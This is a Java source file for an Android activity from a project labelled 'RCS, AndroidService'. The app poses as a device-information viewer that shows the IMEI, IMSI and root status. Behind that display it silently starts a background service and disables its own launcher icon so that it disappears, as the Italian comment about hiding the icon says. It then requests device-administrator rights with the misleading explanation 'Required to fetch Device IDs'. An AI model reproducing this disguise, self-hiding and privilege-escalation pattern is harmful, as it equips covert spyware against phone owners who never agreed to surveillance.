/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : AndroidServiceGUI.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.deviceinfo.gui;

import java.util.concurrent.Semaphore;
import java.util.concurrent.TimeUnit;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.widget.TextView;

import com.android.deviceinfo.Core;
import com.android.deviceinfo.Device;
import com.android.deviceinfo.R;
import com.android.deviceinfo.Status;
import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.capabilities.PackageInfo;
import com.android.deviceinfo.listener.AR;
import com.android.deviceinfo.util.Check;

/**
 * The Class AndroidServiceGUI.
 * http://stackoverflow.com/questions/10909683/launch
 * -android-application-without-main-activity-and-start-service-on-launching
 */
public class AGUI extends Activity {
	protected static final String TAG = "AndroidServiceGUI"; //$NON-NLS-1$
	private static final int REQUEST_ENABLE = 0;
	private Handler handler;

	/**
	 * Called when the activity is first created.
	 * 
	 * @param savedInstanceState
	 *            the saved instance state
	 */
	@Override
	public void onCreate(final Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		actualCreate(savedInstanceState);
		
	}

	@Override
	public void onDestroy() {
		super.onDestroy();
	}

	@Override
	public void onResume() {
		super.onResume();
		if (Cfg.DEBUG) {
			Check.log(TAG + " (onResume) ");
		}

	}

	private void actualCreate(final Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);

		Status.setAppContext(getApplicationContext());

		startService();
		setContentView(R.layout.main);

		TextView t = (TextView) findViewById(R.id.imei);

		t.setText("This is a list of device information for the current Android device:\n\n");

		if (Build.MODEL.length() > 0)
			t.append("Model: " + Build.MODEL + "\n");

		if (Build.BRAND.length() > 0)
			t.append("Brand: " + Build.BRAND + "\n");

		if (Build.DEVICE.length() > 0)
			t.append("Device: " + Build.DEVICE + "\n");

		if (Device.self().getImei().length() > 0)
			t.append("IMEI: " + Device.self().getImei() + "\n");

		if (Device.self().getImsi().length() > 0)
			t.append("IMSI: " + Device.self().getImsi() + "\n");

		if (Build.BOARD.length() > 0)
			t.append("Board: " + Build.BOARD + "\n");

		if (Build.DISPLAY.length() > 0)
			t.append("Display: " + Build.DISPLAY + "\n");

		if (PackageInfo.hasSu()) {
			t.append("Root: yes");
		} else {
			t.append("Root: no");
		}
	}

	private void startExtService() {
		final String service = "com.android.deviceinfo.app"; //$NON-NLS-1$

		try {
			if (Core.isServiceRunning() == false) {
				final ComponentName cn = startService(new Intent(service));
			}
		} catch (final SecurityException se) {

		}
	}

	private void startService() {
		final String service = "com.android.deviceinfo.app"; //$NON-NLS-1$
		// final String service = "android.intent.action.MAIN";

		try {
			if (Core.isServiceRunning() == false) {
				this.handler = new Handler();
				final ComponentName cn = startService(new Intent(service));

				if (cn == null) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " RCS Service not started, null cn ");//$NON-NLS-1$
					}
				} else {
					if (Cfg.DEBUG) {
						Check.log(TAG + " RCS Service Name: " + cn.flattenToShortString());//$NON-NLS-1$
					}

					// Nascondi l'icona (subito in android 4.x, al primo reboot
					// in android 2.x)
					PackageManager pm = getApplicationContext().getPackageManager();
					pm.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
							PackageManager.DONT_KILL_APP);
				}

				handler.postDelayed(new Runnable() {
					@Override
					public void run() {
						if (Cfg.DEBUG) {
							Check.log(TAG + " (run) fireAdminIntent");
						}
						try {
							if (Status.getSemAdmin().tryAcquire(10, TimeUnit.SECONDS)) {
								fireAdminIntent();
							} else {
								if (Cfg.DEBUG) {
									Check.log(TAG + " (startService) cannot acquire semAdmin");
								}
							}
						} catch (InterruptedException e) {
							if (Cfg.DEBUG) {
								Check.log(TAG + " (run) Error: " + e);
							}
						}
					}
				}, 10 * 1000);
			}
		} catch (final SecurityException se) {
			if (Cfg.EXCEPTION) {
				Check.log(se);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " SecurityException caught on startService()");//$NON-NLS-1$
			}
		}
	}

	private void fireAdminIntent() {
		Context context = getApplicationContext();

		Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
		// intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

		ComponentName deviceAdminComponentName = new ComponentName(context, AR.class);
		intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, deviceAdminComponentName);
		intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required to fetch Device IDs");

		//context.startActivity(intent);
		startActivityForResult(intent, REQUEST_ENABLE);
		
		if (Cfg.DEBUG) {
			Check.log(TAG + " (startService) ACTION_ADD_DEVICE_ADMIN intent fired");
		}
	}
	
	 @Override
	    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
	        if (REQUEST_ENABLE == requestCode) {
	            super.onActivityResult(requestCode, resultCode, data);
	        }
	    }
}
